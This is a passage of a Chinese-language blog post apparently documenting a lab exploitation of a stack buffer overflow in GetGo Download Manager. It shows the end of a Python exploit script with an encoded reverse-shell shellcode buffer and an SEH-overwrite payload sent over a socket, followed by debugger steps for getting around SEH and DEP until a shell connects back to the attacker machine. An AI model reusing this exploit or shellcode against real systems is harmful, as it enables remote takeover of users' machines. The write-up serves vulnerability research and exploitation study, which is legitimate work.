class="string">"\xe7\x28\x80\x26\x15\xc0\xd0\xff\x51\x77\xc4\x74\x2f"</span></span><br><span class="line">buf += <span class="string">"\x44\x6f\xc6\xa1\xcc\x8c\x9f\xc0\xfd\x03\xab\x9a\xdd"</span></span><br><span class="line">buf += <span class="string">"\xa2\x78\x97\x57\xbc\x9d\x92\x2e\x37\x55\x68\xb1\x91"</span></span><br><span class="line">buf += <span class="string">"\xa7\x91\x1e\xdc\x07\x60\x5e\x19\xaf\x9b\x15\x53\xd3"</span></span><br><span class="line">buf += <span class="string">"\x26\x2e\xa0\xa9\xfc\xbb\x32\x09\x76\x1b\x9e\xab\x5b"</span></span><br><span class="line">buf += <span class="string">"\xfa\x55\xa7\x10\x88\x31\xa4\xa7\x5d\x4a\xd0\x2c\x60"</span></span><br><span class="line">buf += <span class="string">"\x9c\x50\x76\x47\x38\x38\x2c\xe6\x19\xe4\x83\x17\x79"</span></span><br><span class="line">buf += <span class="string">"\x47\x7b\xb2\xf2\x6a\x68\xcf\x59\xe3\x5d\xe2\x61\xf3"</span></span><br><span class="line">buf += <span class="string">"\xc9\x75\x12\xc1\x56\x2e\xbc\x69\x1e\xe8\x3b\x8d\x35"</span></span><br><span class="line">buf += <span class="string">"\x4c\xd3\x70\xb6\xad\xfa\xb6\xe2\xfd\x94\x1f\x8b\x95"</span></span><br><span class="line">buf += <span class="string">"\x64\x9f\x5e\x39\x34\x0f\x31\xfa\xe4\xef\xe1\x92\xee"</span></span><br><span class="line">buf += <span class="string">"\xff\xde\x83\x11\x2a\x77\x29\xe8\xbd\xb8\x06\xa0\xbb"</span></span><br><span class="line">buf += <span class="string">"\x51\x55\x44\xdb\x37\xd0\xa2\x89\x27\xb5\x7d\x26\xd1"</span></span><br><span class="line">buf += <span class="string">"\x9c\xf5\xd7\x1e\x0b\x70\xd7\x95\xb8\x85\x96\x5d\xb4"</span></span><br><span class="line">buf += <span class="string">"\x95\x4f\xae\x83\xc7\xc6\xb1\x39\x6f\x84\x20\xa6\x6f"</span></span><br><span class="line">buf += <span class="string">"\xc3\x58\x71\x38\x84\xaf\x88\xac\x38\x89\x22\xd2\xc0"</span></span><br><span class="line">buf += <span class="string">"\x4f\x0c\x56\x1f\xac\x93\x57\xd2\x88\xb7\x47\x2a\x10"</span></span><br><span class="line">buf += <span class="string">"\xfc\x33\xe2\x47\xaa\xed\x44\x3e\x1c\x47\x1f\xed\xf6"</span></span><br><span class="line">buf += <span class="string">"\x0f\xe6\xdd\xc8\x49\xe7\x0b\xbf\xb5\x56\xe2\x86\xca"</span></span><br><span class="line">buf += <span class="string">"\x57\x62\x0f\xb3\x85\x12\xf0\x6e\x0e\x22\xbb\x32\x27"</span></span><br><span class="line">buf += <span class="string">"\xab\x62\xa7\x75\xb6\x94\x12\xb9\xcf\x16\x96\x42\x34"</span></span><br><span class="line">buf += <span class="string">"\x06\xd3\x47\x70\x80\x08\x3a\xe9\x65\x2e\xe9\x0a\xac"</span></span><br><span class="line"></span><br><span class="line">reverse = buf</span><br><span class="line"></span><br><span class="line">fill = <span class="string">"D"</span>*(<span class="number">4055</span> - len(reverse))</span><br><span class="line"></span><br><span class="line">payload = junk + nseh + seh + reverse + fill</span><br><span class="line"></span><br><span class="line">buffer = payload + <span class="string">"\r"</span></span><br><span class="line">buffer+= payload + <span class="string">"\r"</span></span><br><span class="line">buffer+= payload + <span class="string">"\r\n"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> bz.recv(<span class="number">1000</span>)</span><br><span class="line">bz.send(buffer)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] sending buffer ok\n"</span></span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line">bz.close()</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
<p>运行起来后，在攻击机器上监听 80 端口，在 GetGo 中点击下载，输入：<a href="http://192.168.82.134/" target="_blank" rel="noopener">http://192.168.82.134/</a></p>
<p><img src="/images/stack_over/41.png" alt="41"></p>
<p>攻击机器上的 exp 已经有所反应；</p>
<p><img src="/images/stack_over/42.png" alt="42"></p>
<p>调试器确发现了 异常：</p>
<p><img src="/images/stack_over/43.png" alt="43"></p>
<p>查看此时的 SEH 链（View -&gt; SEH chain）：</p>
<p><img src="/images/stack_over/44.png" alt="44"></p>
<p>右键 follow 跟随，在 0x0072FE28 处下一个断点</p>
<p><img src="/images/stack_over/45.png" alt="45"></p>
<p>在键盘上按 shift + F7 键忽略异常继续执行</p>
<p><img src="/images/stack_over/59.png" alt="59"></p>
<p>执行返回</p>
<p><img src="/images/stack_over/46.png" alt="46"></p>
<p><img src="/images/stack_over/47.png" alt="47"></p>
<p>继续执行返回</p>
<p><img src="/images/stack_over/48.png" alt="48"></p>
<p>一路狂按下去，直到找到 TEST AL AL</p>
<p><img src="/images/stack_over/49.png" alt="49"></p>
<p>修改 EAX 地址</p>
<p> 修改前：</p>
<p><img src="/images/stack_over/50.png" alt="50"></p>
<p>修改后：</p>
<p><img src="/images/stack_over/51.png" alt="51"></p>
<p>在下一个 SEH 链下一个断点，本例为 0x7602c49c</p>
<p><img src="/images/stack_over/52.png" alt="52"></p>
<p>继续运行</p>
<p><img src="/images/stack_over/53.png" alt="53"></p>
<p>此时，可以看到程序在 0x7602c49c 处停下</p>
<p><img src="/images/stack_over/54.png" alt="54"></p>
<p>继续执行</p>
<p><img src="/images/stack_over/55.png" alt="55"></p>
<p>之后会发现程序又抛出异常</p>
<p><img src="/images/stack_over/56.png" alt="56"></p>
<p>除了 SEH 保护外，还有 DEP 保护</p>
<p>找到所在的栈空间，赋予执行权限</p>
<p><img src="/images/stack_over/57.png" alt="57"></p>
<p>发现可以在栈上继续调试程序。继续执行程序，在攻击机器上可以看到 shell 能成功返回。</p>
<p><img src="/images/stack_over/58.png" alt="58"></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-实验环境"><span class="toc-number">1.</span> <span class="toc-text">0x01 实验环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-详细调试步骤"><span class="toc-number">2.</span> <span class="toc-text">0x02 详细调试步骤</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://liangyuewei.com/2019/11/16/GetGo Download Manager 栈溢出/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://liangyuewei.com/2019/11/16/GetGo Download Manager 栈溢出/&text=GetGo Download Manager 栈溢出"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://liangyuewei.com/2019/11/16/GetGo Download Manager 栈溢出/&title=GetGo Download Manager 栈溢出"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://liangyuewei.com/2019/11/16/GetGo Download Manager 栈溢出/&is_video=false&description=GetGo Download Manager 栈溢出"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=GetGo Download Manager 栈溢出&body=Check out this article: http://liangyuewei.com/2019/11/16/GetGo Download Manager 栈溢出/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://liangyuewei.com/2019/11/16/GetGo Download Manager 栈溢出/&title=GetGo Download Manager 栈溢出"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://liangyuewei.com/2019/11/16/GetGo Download Manager 栈溢出/&title=GetGo Download Manager 栈溢出"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://liangyuewei.com/2019/11/16/GetGo Download Manager 栈溢出/&title=GetGo Download Manager 栈溢出"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://liangyuewei.com/2019/11/16/GetGo Download Manager 栈溢出/&title=GetGo Download Manager 栈溢出"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://liangyuewei.com/2019/11/16/GetGo Download Manager 栈溢出/&name=GetGo Download Manager 栈溢出&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2019 Yuewei.Liang
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

    <!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-86660611-1', 'auto');
        ga('send', 'pageview');
    </script>

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


</body>
</html>
